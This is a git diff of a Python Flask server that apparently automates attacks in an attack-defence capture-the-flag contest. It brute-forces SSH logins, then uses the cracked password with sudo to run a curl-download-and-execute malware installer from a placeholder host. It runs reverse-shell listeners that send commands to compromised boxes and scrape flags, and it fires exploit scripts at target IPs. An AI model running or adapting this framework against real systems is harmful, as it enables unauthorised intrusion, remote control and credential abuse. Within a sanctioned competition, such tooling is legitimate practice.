@@ -12,6 +12,7 @@ from datetime import datetime, timedelta
 from threading import Thread
 
 import paramiko
+import requests
 from flask import Flask, request, render_template, flash, redirect, url_for
 from flask_bootstrap import Bootstrap
 from flask_sqlalchemy import SQLAlchemy
@@ -30,9 +31,13 @@ THREADS = []
 DEFAULT_SUBNET = "172.16.T.B"
 DEFAULT_WHITELISTED_IPS = "127.0.0.1"
 DEFAULT_FLAG_REGEX = "NCX\{[^\{\}]{1,100}\}"
+DEFAULT_FLAG_SUBMIT_CONNECT_SID = ""
+DEFAULT_FLAG_SUBMIT_RC_UID = ""
+DEFAULT_FLAG_SUBMIT_RC_TOKEN = ""
+DEFAULT_FLAG_SUBMIT_SESSION = ""
 DEFAULT_MALWARE_PATH = "malware_installer"
 DEFAULT_MALWARE_INSTALL = "curl -o installer http://CHANGE_ME/i && chmod +x installer && ./installer"
-DEFAULT_MALWARE_REV_SHELL_PORT_USER = "53"
+DEFAULT_MALWARE_REV_SHELL_PORT_USER = "445"
 DEFAULT_MALWARE_REV_SHELL_PORT_ROOT = "443"
 DEFAULT_STATUS_PWNED_TIMEOUT = "300"
 DEFAULT_STATUS_FLAGS_TIMEOUT = "300"
@@ -48,6 +53,7 @@ DEFAULT_SPAM_RAND_FILE = "rand_file.txt"
 # Create Flask and database
 app = Flask(__name__, template_folder=TEMPLATE_DIR)
 app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///" + DB_FILE
+app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
 app.secret_key = "CyberChef2"
 db = SQLAlchemy(app)
 Bootstrap(app)
@@ -63,6 +69,10 @@ def main():
     add_setting("whitelisted_ips", DEFAULT_WHITELISTED_IPS,
                 "IPs, separated by commas and no spaces, that are allowed to access admin site")
     add_setting("flag_regex", DEFAULT_FLAG_REGEX, "Regex to search for flags with")
+    add_setting("flag_submit_connect.sid", DEFAULT_FLAG_SUBMIT_CONNECT_SID, "Flag submission connect.sid cookie")
+    add_setting("flag_submit_rc_uid", DEFAULT_FLAG_SUBMIT_RC_UID, "Flag submission rc_uid cookie")
+    add_setting("flag_submit_rc_token", DEFAULT_FLAG_SUBMIT_RC_TOKEN, "Flag submission rc_token cookie")
+    add_setting("flag_submit_session", DEFAULT_FLAG_SUBMIT_SESSION, "Flag submission session cookie")
     add_setting("malware_path", DEFAULT_MALWARE_PATH, "Path to first stage of binary")
     add_setting("malware_install", DEFAULT_MALWARE_INSTALL, "Command to install malware")
     add_setting("malware_rev_shell_port_user", DEFAULT_MALWARE_REV_SHELL_PORT_USER,
@@ -125,6 +135,7 @@ def check_admin():
 def admin_home():
     return render_template("home.html", total_boxes=Box.query.count(),
                            pwned_boxes=Box.query.filter_by(pwned=True).count(),
+                           pwned_boxes_root=Box.query.filter_by(pwned_root=True).count(),
                            flag_boxes=Box.query.filter_by(flags=True).count(),
                            flags_found=Flag.query.count(),
                            flags_submitted=Flag.query.filter(Flag.submitted.isnot(None)).count())
@@ -334,6 +345,31 @@ def admin_boxes():
 @app.route("/admin/flags", methods=["GET"])
 def admin_flags():
     return render_template("flags.html", flags=Flag.query.order_by(Flag.found.desc()).all(), subnet=half_subnet())
+
+
+@app.route("/admin/flags/submit", methods=["GET"])
+def admin_flags_submit():
+    flags = Flag.query.filter(Flag.submitted == None).all()
+    submit_flags(flags)
+    flash("Flags submitted")
+    log("admin", f"submitting un-submitted flags from {request.remote_addr}")
+    return redirect(url_for("admin_flags"))
+
+
+@app.route("/admin/flags/mark", methods=["GET"])
+def admin_flags_mark():
+    # Get parameters
+    id = int(request.args.get("id"))
+
+    # Update in database
+    flag = Flag.query.get(id)
+    flag.submitted = datetime.now()
+    db.session.commit()
+
+    # Flash and redirect
+    flash("Flag marked as submitted")
+    log("admin", f"flag {id} marked as submitted by {request.remote_addr}")
+    return redirect(url_for("admin_flags"))
 
 
 @app.route("/admin/exfils", methods=["GET"])
@@ -632,6 +668,7 @@ def admin_ssh_passwords_update():
 def install():
     with open(Setting.query.get("malware_path").value, "rb") as f:
         data = f.read()
+    log("install_endpoint", f"install from {request.remote_addr}")
     return data
 
 
@@ -719,6 +756,7 @@ def status():
                 if delta < datetime.now():
                     log("status", f"box with team {box.team_num} and service {box.service_ip} no longer pwned")
                     box.pwned = False
+                    box.pwned_root = False
                     db.session.commit()
 
             # Check if still getting flags
@@ -745,7 +783,7 @@ def rev_shell_user_server():
     # Start listening
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind(("0.0.0.0", port))
-    s.listen(100)
+    s.listen(30)
     log("rev_shell_user_server", f"listening on port {port}")
 
     # Keep accepting connections
@@ -766,7 +804,7 @@ def rev_shell_root_server():
     # Start listening
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind(("0.0.0.0", port))
-    s.listen(100)
+    s.listen(30)
     log("rev_shell_root_server", f"listening on port {port}")
 
     # Keep accepting connections
@@ -821,7 +859,7 @@ def new_rev_shell(root_shell, client, ip):
             db.session.commit()
 
     # Send the commands
-    data = ""
+    all_data = ""
     for command in commands:
         log(log_type, f"sending command '{command}' to IP {ip}")
         client.send(str.encode(command + "\n"))
@@ -831,8 +869,9 @@ def new_rev_shell(root_shell, client, ip):
             if len(data) < 1:
                 break
         data = data.decode("utf-8")
+        all_data += data + "\n"
         log(log_type, f"received '{data}' from IP {ip}")
-    extract_flags(data, box, log_type)
+    extract_flags(all_data, box, log_type)
 
     # Close the connection
     client.shutdown(2)
@@ -874,7 +913,7 @@ def run_scripts():
                     ip = get_ip(subnet, box)
                     log("run_scripts", f"running script {script.path} against {ip}")
                     try:
-                        output = subprocess.check_output(f"py {path} {ip}", shell=True, stderr=subprocess.STDOUT)
+                        output = subprocess.check_output(f"'./{path}' {ip}", shell=True, stderr=subprocess.STDOUT)
                     except subprocess.CalledProcessError as e:
                         log("run_scripts",
                             f"script {script.path} against {ip} failed with '{e.output.decode('utf-8')}'")
@@ -946,7 +985,9 @@ def ssh_bruteforce():
                         f"success to {ip}:{box.service.ssh_port} with username {username} and password {password}")
 
                     # Install malware
-                    ssh_cmd(client, malware_install)
+                    ssh_cmd(client, f"echo '{malware_install}' > thing.sh")
+                    ssh_cmd(client, f"echo '{password}' | sudo -S sh thing.sh")
+                    ssh_cmd(client, "rm thing.sh")
 
                     # Close the connection
                     client.close()
@@ -1056,14 +1097,27 @@ def extract_flags(data, box, source):
                 f"new flag {flag} added from team {box.team_num} and service {box.service_ip} from {source}")
 
     # Submit the flags
-    for flag in new_flags:
+    submit_flags(new_flags)
+
+
+def submit_flags(flags):
+    # Get settings from database
+    connect_sid = Setting.query.get("flag_submit_connect.sid").value
+    rc_uid = Setting.query.get("flag_submit_rc_uid").value
+    rc_token = Setting.query.get("flag_submit_rc_token").value
+    session = Setting.query.get("flag_submit_session").value
+    host = "https://combat.ctf.ncx2019.com/challenges"
+
+    # Iterate over flags to submit
+    for flag in flags:
         # TODO: submit the flag and check for success
         success = False
         if success:
             flag.submitted = datetime.now()
             db.session.commit()
-            log("extract_flags",
-                f"flag {flag} successfully submitted from team {box.team_num} and service {box.service_ip} from {source}")
+            log("submit_flags", f"flag {flag} successfully submitted")
+        else:
+            log("submit_flags", f"failed to submit flag {flag}")
 
 
 def get_ip(subnet, box):
